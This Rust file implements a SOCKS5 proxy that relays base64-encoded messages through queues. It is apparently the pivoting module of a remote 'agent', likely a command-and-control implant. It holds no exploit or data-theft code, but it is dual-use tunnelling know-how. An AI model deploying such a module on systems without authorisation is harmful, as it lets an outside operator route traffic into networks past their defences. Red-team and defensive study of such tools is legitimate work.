// socks.rs
use base64::{engine::general_purpose, Engine as _};
use once_cell::sync::Lazy;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::error::Error;
use std::io::{ErrorKind, Read, Write};
use std::net::{Ipv4Addr, Ipv6Addr, SocketAddr, TcpStream, ToSocketAddrs};
use std::sync::{mpsc, Arc, Mutex};
use std::time::Duration;

#[derive(Deserialize, Serialize, Debug, Clone)]
pub struct SocksMsg {
    pub exit: bool,
    pub server_id: u32,
    pub data: String,
}

// =========================
// Global SOCKS Queues
// =========================
pub static SOCKS_INBOUND_QUEUE: Lazy<Arc<Mutex<Vec<SocksMsg>>>> =
    Lazy::new(|| Arc::new(Mutex::new(Vec::new())));
pub static SOCKS_OUTBOUND_QUEUE: Lazy<Arc<Mutex<Vec<SocksMsg>>>> =
    Lazy::new(|| Arc::new(Mutex::new(Vec::new())));

#[derive(Debug)]
pub struct SocksState {
    pub connections: Arc<Mutex<HashMap<u32, TcpStream>>>,
}

impl SocksState {
    pub fn new() -> Self {
        Self {
            connections: Arc::new(Mutex::new(HashMap::new())),
        }
    }
}

// =========================
// SOCKS Processing Functions
// =========================

/// Process SOCKS messages synchronously (called from main agent loop)
pub fn process_socks_messages_sync() -> Result<(), Box<dyn Error>> {
    // Use a static state to maintain connections across calls
    static SOCKS_STATE: Lazy<Arc<SocksState>> = Lazy::new(|| Arc::new(SocksState::new()));
    let state = SOCKS_STATE.clone();
    
    // Check for new SOCKS messages in the inbound queue
    let msgs_to_process: Vec<SocksMsg> = {
        if let Ok(mut queue) = SOCKS_INBOUND_QUEUE.lock() {
            if !queue.is_empty() {
                let msgs = queue.drain(..).collect::<Vec<_>>();
                // eprintln!("[SOCKS] Processing {} inbound messages", msgs.len());
                msgs
            } else {
                Vec::new()
            }
        } else {
            Vec::new()
        }
    };

    if !msgs_to_process.is_empty() {
        if let Err(_e) = process_socks_messages(msgs_to_process, &state) {
            // eprintln!("[SOCKS] Processing error: {e}");
            // Don't propagate the error to avoid panicking the main agent
        }
    }

    Ok(())
}

/// Legacy function (not used in new implementation)
pub fn start_socks(
    _tx: &mpsc::Sender<serde_json::Value>,
    _rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // eprintln!("DEBUG: Legacy SOCKS thread started (not used in new implementation)");
    Ok(())
}

// =========================
// SOCKS Message Processing
// =========================
fn process_socks_messages(
    msgs: Vec<SocksMsg>,
    state: &Arc<SocksState>,
) -> Result<(), Box<dyn Error>> {
    let mut conns = match state.connections.lock() {
        Ok(c) => c,
        Err(e) => e.into_inner(),
    };
    let mut responses = Vec::new();

    for msg in msgs {
        if msg.exit {
            if let Some(stream) = conns.remove(&msg.server_id) {
                let _ = stream.shutdown(std::net::Shutdown::Both);
                // Connection closed
            }
            continue;
        }

        let data = general_purpose::STANDARD.decode(&msg.data).unwrap_or_default();
        if data.is_empty() {
            // eprintln!("[SOCKS] Message {} has empty data", msg.server_id);
            continue;
        }

        // eprintln!("[SOCKS] Processing message for server_id={}, data_len={}", msg.server_id, data.len());

        // Process SOCKS message

        if let Some(stream) = conns.get_mut(&msg.server_id) {
            // eprintln!("[SOCKS] Existing connection for server_id={}, forwarding data", msg.server_id);
            // Try to write data to the target server (non-blocking)
            if let Err(_e) = stream.write_all(&data) {
                // Write failed - close connection
                responses.push(SocksMsg {
                    exit: true,
                    server_id: msg.server_id,
                    data: String::new(),
                });
                conns.remove(&msg.server_id);
                continue;
            }

            // Try to read any available response data with short timeout
            let mut buf = [0u8; 4096];
            stream.set_read_timeout(Some(Duration::from_millis(10)))?;

            match stream.read(&mut buf) {
                Ok(0) => {
                    // Target closed connection
                    responses.push(SocksMsg {
                        exit: true,
                        server_id: msg.server_id,
                        data: String::new(),
                    });
                    conns.remove(&msg.server_id);
                }
                Ok(n) => {
                    // Forward data from target to client
                    responses.push(SocksMsg {
                        exit: false,
                        server_id: msg.server_id,
                        data: general_purpose::STANDARD.encode(&buf[..n]),
                    });
                }
                Err(e) if e.kind() == ErrorKind::WouldBlock || e.kind() == ErrorKind::TimedOut => {
                    // No data available - this is normal, continue
                }
                Err(_) => {
                    // Read error - close connection
                    responses.push(SocksMsg {
                        exit: true,
                        server_id: msg.server_id,
                        data: String::new(),
                    });
                    conns.remove(&msg.server_id);
                }
            }
        } else {
            // ======================
            // Phase 1: SOCKS5 Greeting
            // ======================
            if data.len() == 3 && data[0] == 0x05 && data[1] == 0x01 && data[2] == 0x00 {
                // eprintln!("[SOCKS] Greeting received for server_id={}", msg.server_id);
                // SOCKS5 handshake greeting
                responses.push(SocksMsg {
                    exit: false,
                    server_id: msg.server_id,
                    data: general_purpose::STANDARD.encode(&[0x05, 0x00]), // no auth required
                });
                continue;
            }

            // ======================
            // Phase 2: SOCKS5 Connect
            // ======================
            // eprintln!("[SOCKS] Attempting to parse CONNECT for server_id={}", msg.server_id);
            if let Some((target_addr, response_data)) = handle_socks_connect(&data) {
                // eprintln!("[SOCKS] Connecting to target: {:?}", target_addr);
                match TcpStream::connect(&target_addr) {
                    Ok(stream) => {
                        // eprintln!("[SOCKS] Successfully connected to {:?}", target_addr);
                        let _ = stream.set_nodelay(true);
                        responses.push(SocksMsg {
                            exit: false,
                            server_id: msg.server_id,
                            data: general_purpose::STANDARD.encode(&response_data),
                        });
                        conns.insert(msg.server_id, stream);
                    }
                    Err(_e) => {
                        let err_resp = build_socks5_error(0x05);
                        responses.push(SocksMsg {
                            exit: false,
                            server_id: msg.server_id,
                            data: general_purpose::STANDARD.encode(&err_resp),
                        });
                        // Connection failed
                    }
                }
            } else {
                // eprintln!("[SOCKS] Failed to parse CONNECT request for server_id={}", msg.server_id);
            }
        }
    }

    // Send accumulated responses
    if !responses.is_empty() {
        if let Ok(mut q) = SOCKS_OUTBOUND_QUEUE.lock() {
            q.extend(responses);
        }
    }

    // Additionally, poll all existing connections for any data that might have arrived
    // This ensures we don't miss server responses
    poll_all_connections(&mut *conns)?;

    Ok(())
}

/// Poll all existing SOCKS connections for data from the target server
fn poll_all_connections(conns: &mut HashMap<u32, TcpStream>) -> Result<(), Box<dyn Error>> {
    let mut responses = Vec::new();
    let mut to_remove = Vec::new();

    for (server_id, stream) in conns.iter_mut() {
        // Set a short read timeout
        if let Err(_) = stream.set_read_timeout(Some(Duration::from_millis(10))) {
            continue;
        }

        let mut buf = [0u8; 4096];
        match stream.read(&mut buf) {
            Ok(0) => {
                // Connection closed by server
                // eprintln!("[SOCKS] Server closed connection for server_id={}", server_id);
                to_remove.push(*server_id);
                responses.push(SocksMsg {
                    exit: true,
                    server_id: *server_id,
                    data: String::new(),
                });
            }
            Ok(n) => {
                // Data available from server
                // eprintln!("[SOCKS] Read {} bytes from server for server_id={}", n, server_id);
                responses.push(SocksMsg {
                    exit: false,
                    server_id: *server_id,
                    data: general_purpose::STANDARD.encode(&buf[..n]),
                });
            }
            Err(e) if e.kind() == ErrorKind::WouldBlock || e.kind() == ErrorKind::TimedOut => {
                // No data available - this is normal
            }
            Err(_e) => {
                to_remove.push(*server_id);
                responses.push(SocksMsg {
                    exit: true,
                    server_id: *server_id,
                    data: String::new(),
                });
            }
        }
    }

    // Remove closed connections
    for server_id in &to_remove {
        conns.remove(server_id);
    }

    // Add responses to the queue
    if !responses.is_empty() {
        if let Ok(mut q) = SOCKS_OUTBOUND_QUEUE.lock() {
            q.extend(responses);
        }
    }

    Ok(())
}

// =========================
// SOCKS5 Parsing Helpers
// =========================
fn handle_socks_connect(data: &[u8]) -> Option<(SocketAddr, Vec<u8>)> {
    if data.len() < 10 {
        return None;
    }
    if data[0] != 0x05 || data[1] != 0x01 || data[2] != 0x00 {
        return None;
    }

    let atyp = data[3];
    let addr = match atyp {
        0x01 => {
            if data.len() < 10 {
                return None;
            }
            let ip = Ipv4Addr::new(data[4], data[5], data[6], data[7]);
            let port = u16::from_be_bytes([data[8], data[9]]);
            SocketAddr::from((ip, port))
        }
        0x03 => {
            let domain_len = data[4] as usize;
            if data.len() < 5 + domain_len + 2 {
                return None;
            }
            let domain = String::from_utf8_lossy(&data[5..5 + domain_len]);
            let port = u16::from_be_bytes([data[5 + domain_len], data[5 + domain_len + 1]]);
            (domain.as_ref(), port).to_socket_addrs().ok()?.next()?
        }
        0x04 => {
            if data.len() < 22 {
                return None;
            }
            let mut octets = [0u8; 16];
            octets.copy_from_slice(&data[4..20]);
            let ip = Ipv6Addr::from(octets);
            let port = u16::from_be_bytes([data[20], data[21]]);
            SocketAddr::from((ip, port))
        }
        _ => return None,
    };

    let response = build_socks5_success(addr);
    Some((addr, response))
}

fn build_socks5_success(addr: SocketAddr) -> Vec<u8> {
    let mut res = vec![0x05, 0x00, 0x00];
    match addr {
        SocketAddr::V4(v4) => {
            res.push(0x01);
            res.extend_from_slice(&v4.ip().octets());
            res.extend_from_slice(&v4.port().to_be_bytes());
        }
        SocketAddr::V6(v6) => {
            res.push(0x04);
            res.extend_from_slice(&v6.ip().octets());
            res.extend_from_slice(&v6.port().to_be_bytes());
        }
    }
    res
}

fn build_socks5_error(code: u8) -> Vec<u8> {
    vec![0x05, code, 0x00, 0x01, 0, 0, 0, 0, 0, 0]
}

// =========================
// SOCKS Queue Management
// =========================
pub fn get_socks_responses() -> Vec<SocksMsg> {
    if let Ok(mut queue) = SOCKS_OUTBOUND_QUEUE.lock() {
        let responses = queue.drain(..).collect();
        // eprintln!("[SOCKS] Retrieved {} responses from SOCKS_OUTBOUND_QUEUE", count);
        responses
    } else {
        // eprintln!("[SOCKS] Failed to lock SOCKS_OUTBOUND_QUEUE");
        Vec::new()
    }
}
